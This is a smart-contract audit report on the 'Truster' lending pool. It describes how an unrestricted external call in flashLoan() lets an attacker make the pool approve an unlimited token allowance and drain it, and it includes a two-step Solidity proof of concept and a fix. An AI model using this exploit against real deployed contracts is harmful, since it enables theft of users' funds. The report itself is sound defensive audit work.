---
title: Truster Audit Report
author: Jack
date: January 07, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] Arbitrary external call injection in `flashLoan()` allows attacker to pre-approve unlimited token withdrawal

**Description:** `TrusterLenderPool::flashLoan()` accepts a `target` address and `data` payload, then executes them on behalf of the pool contract with no restrictions:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    // ⚠️ Pool executes arbitrary external call as itself
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

An attacker can supply `target = address(token)` and `data = abi.encodeCall(token.approve, (attacker, type(uint256).max))`. This causes the pool to call `token.approve(attacker, 2^256 - 1)` in its own name, granting the attacker an unlimited allowance to spend the pool's token balance. The repayment check is trivially satisfied by setting `amount = 0` (no tokens need to be borrowed).

**Impact:** An attacker can drain the entire token balance of the pool in a single transaction (deploy attack contract → call flashLoan with approval payload → call transferFrom to steal all tokens). The 1,000,000 DVT held by the pool can be stolen completely.

**Proof of Concept:**

```solidity
// Step 1: Use flashLoan to make the pool approve attacker
pool.flashLoan(
    0,
    attacker,
    address(token),
    abi.encodeCall(token.approve, (attacker, type(uint256).max))
);

// Step 2: transferFrom drain — no loan repayment needed
token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
```

Attack is executable in a single transaction via a dedicated attack contract.

**Recommended Mitigation:**

Remove the arbitrary external call capability from `flashLoan()`. Flashloan callbacks should be handled via a standardized interface (e.g., `IERC3156FlashBorrower`) invoked on the `borrower`, not on an arbitrary `target`:

```diff
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    token.transfer(borrower, amount);
-   target.functionCall(data);
+   if (IERC3156FlashBorrower(borrower).onFlashLoan(msg.sender, address(token), amount, 0, data) != CALLBACK_SUCCESS)
+       revert CallbackFailed();
    if (token.balanceOf(address(this)) < balanceBefore) revert RepayFailed();
    return true;
}
```

If the arbitrary call feature is intentional, restrict `target` to a whitelist of known safe contracts and block calls to the pool's underlying token contract.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
